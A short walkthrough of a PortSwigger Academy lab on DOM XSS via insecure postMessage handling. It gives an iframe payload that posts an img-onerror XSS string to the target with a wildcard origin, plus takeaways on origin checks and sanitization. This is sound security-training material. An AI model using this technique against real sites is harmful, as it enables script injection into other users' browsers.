# DOM - XSS using web messages

## 📌 Lab Details
- **Title**: DOM XSS using web messages
- **Difficulty**: Practitioner
- **Category**: DOM-based vulnerability
- **Lab URL**: https://portswigger.net/academy/labs/launch/ce814bae27379e097e9d714cfb763781f05932d2b95c2b194386687a89f6e2ac?referrer=%2fweb-security%2fdom-based%2fcontrolling-the-web-message-source%2flab-dom-xss-using-web-messages

## 🔍 Summary
This lab shows exploiting insecure `postMessage` handling by sending a crafted message containing an XSS payload (`<img src=1 onerror=print()>`) via an iframe to trigger `print()` on the target site.

## 🛠 Steps to Solve
1. Notice that the home page contains an `addEventListener()` call that listens for a web message.
2. Inject the payload on the **Exploit** server:
   ```sh
   <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
   ```
3. Store the exploit and deliver it to the victim.

## 📖 Key Takeaways
- Demonstrates **web message XSS** when `postMessage` data is directly inserted into the DOM without sanitization.
- Using an iframe with `onload` and `postMessage` can deliver payloads without user interaction.
- Highlights the need for **origin checks and output sanitization** when using `postMessage` in web apps.

## 🖼️ Screenshot 
![image](https://github.com/user-attachments/assets/88a20d16-7a79-4833-aa11-f7853927b42f)
![image](https://github.com/user-attachments/assets/245581fc-5c71-4552-9ace-262897f45e83)
![image](https://github.com/user-attachments/assets/af8e4991-cbdb-4d82-acc9-dce64d7a8470)
![image](https://github.com/user-attachments/assets/22980211-2e07-45c2-b336-fe85a4e44cd7)
![image](https://github.com/user-attachments/assets/44ea0561-0d66-4ea0-83ac-065619785122)
